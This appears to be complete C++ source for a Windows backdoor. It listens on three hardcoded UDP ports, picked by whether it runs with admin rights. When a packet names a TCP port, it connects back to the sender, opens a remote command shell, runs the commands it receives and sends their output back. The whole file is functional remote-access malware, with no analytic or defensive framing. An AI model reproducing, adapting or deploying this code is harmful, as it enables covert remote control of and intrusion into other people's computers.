#include <iostream>
#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")

constexpr int DEFAULT_BUFLEN = 1024;

bool runCommand(char* cmd, SOCKET sock) {
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = true;
    sa.lpSecurityDescriptor = NULL;

    HANDLE outRead, outWrite;
    if (!CreatePipe(&outRead, &outWrite, &sa, 0)) {
        printf("Creating stdout pipe failed\n");
        return false;
    }
    SetHandleInformation(outRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.hStdOutput = outWrite;
    si.hStdError = outWrite;
    si.dwFlags = STARTF_USESTDHANDLES;

    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(pi));

    if (!CreateProcessA(NULL, cmd, NULL, NULL, true, 0, NULL, NULL, &si, &pi)) {
        printf("Creating process failed: %ld\n", GetLastError());
        CloseHandle(outRead);
        CloseHandle(outWrite);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }
    CloseHandle(outWrite);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    char buf[DEFAULT_BUFLEN];
    while (true) {
        memset(buf, 0, sizeof(buf));
        unsigned long numRead = 0;
        printf("Reading into buffer\n");
        int success = ReadFile(outRead, buf, DEFAULT_BUFLEN, &numRead, NULL);
        int brokenPipe = GetLastError() == ERROR_BROKEN_PIPE;
        if (!success && !brokenPipe) {
            printf("Pipe read failed\n");
            CloseHandle(outRead);
            return false;
        }
        if (numRead == 0) break;
        printf("Read data: '%s'\n", buf);
        for (int i = 0; i < numRead;) {
            int numSent = send(sock, buf + i, numRead - i, 0);
            if (numSent == SOCKET_ERROR) {
                printf("Send failed\n");
                CloseHandle(outRead);
                return false;
            }
            i += numSent;
        }
        if (brokenPipe) break;
    }

    printf("Ending!\n");
    CloseHandle(outRead);
    return true;
}

DWORD startShell(void* arg) {
    SOCKADDR_IN* serverAddr = (SOCKADDR_IN*)arg;

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        printf("Error at socket(): %ld\n", WSAGetLastError());
        delete serverAddr;
        return 1;
    }

    if (connect(sock, (SOCKADDR*)serverAddr, sizeof(*serverAddr)) == SOCKET_ERROR) {
        printf("Couldn't connect to server\n");
        closesocket(sock);
        delete serverAddr;
        return 1;
    }

    const char* greeting = "Connected to machine\n> ";
    if (send(sock, greeting, (int)strlen(greeting), 0) == SOCKET_ERROR) {
        printf("Greeting failed: %d\n", WSAGetLastError());
        shutdown(sock, SD_BOTH);
        closesocket(sock);
        delete serverAddr;
        return 1;
    }

    char buf[DEFAULT_BUFLEN];
    while (true) {
        memset(buf, 0, sizeof(buf));
        int numBytes = recv(sock, buf, DEFAULT_BUFLEN, 0);
        if (numBytes == 0) {
            printf("Connection closed\n");
            break;
        }
        else if (numBytes < 0) {
            printf("recv failed: %d\n", WSAGetLastError());
            shutdown(sock, SD_BOTH);
            closesocket(sock);
            delete serverAddr;
            return 1;
        }
        printf("Command received: %s\n", buf);
        if (!runCommand(buf, sock)) {
            shutdown(sock, SD_BOTH);
            closesocket(sock);
            delete serverAddr;
            return 1;
        }
        const char* prompt = "> ";
        if (send(sock, prompt, (int)strlen(prompt), 0) == SOCKET_ERROR) {
            printf("Sending prompt failed: %d\n", WSAGetLastError());
            shutdown(sock, SD_BOTH);
            closesocket(sock);
            delete serverAddr;
            return 1;
        }
    }

    shutdown(sock, SD_BOTH);
    closesocket(sock);
    delete serverAddr;
    return 0;
}

DWORD initServer(void* arg) {
    int udpPort = *(int*)arg;

    std::cout << "Starting server for UDP port " << udpPort << std::endl;

    SOCKET udpServerSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpServerSock == INVALID_SOCKET) {
        printf("Error at socket(): %ld\n", WSAGetLastError());
        return 1;
    }

    SOCKADDR_IN serverAddr;
    serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);
    serverAddr.sin_port = htons(udpPort);
    serverAddr.sin_family = AF_INET;

    if (bind(udpServerSock, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("bind failed with error: %d\n", WSAGetLastError());
        closesocket(udpServerSock);
        return 1;
    }

    std::cout << "Bound server, waiting for data...\n";

    char buf[DEFAULT_BUFLEN];
    SOCKADDR_IN clientSock;
    int clientSockLen = sizeof(clientSock);
    while (true) {
        memset(buf, 0, sizeof(buf));
        int numRecv = recvfrom(udpServerSock, buf, DEFAULT_BUFLEN, 0, (SOCKADDR*)&clientSock, &clientSockLen);
        if (numRecv <= 0) {
            printf("Server: Connection closed with error code: %ld\n", WSAGetLastError());
            continue;
        }

        int tcpPort = atoi(buf);
        if (tcpPort == 0) {
            std::cout << "Invalid port. Data received: " << buf << std::endl;
            continue;
        }
        std::cout << "Connecting to " << tcpPort << std::endl;

        SOCKADDR_IN* tcpServerAddr = new SOCKADDR_IN();
        tcpServerAddr->sin_addr = clientSock.sin_addr;
        tcpServerAddr->sin_port = htons(tcpPort);
        tcpServerAddr->sin_family = AF_INET;
        CreateThread(NULL, 0, startShell, tcpServerAddr, 0, NULL);
    }

    return 0;
}

// Copied from a StackOverflow answer, supposedly not perfect but should work
BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    return fRet;
}

int main()
{
    WSADATA wsaData;

    int res = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (res != 0) {
        printf("WSAStartup failed: %d\n", res);
        return 1;
    }

    int adminPorts[] = { 44070, 52175, 21238 };
    int userPorts[] = { 20397, 18149, 48819 };
    int* ports = IsElevated() ? adminPorts : userPorts;

    HANDLE handles[] = {
        CreateThread(NULL, 0, initServer, &ports[0], 0, NULL),
        CreateThread(NULL, 0, initServer, &ports[1], 0, NULL),
        CreateThread(NULL, 0, initServer, &ports[2], 0, NULL)
    };
    WaitForMultipleObjects(sizeof(handles) / sizeof(HANDLE), handles, true, INFINITE);
}
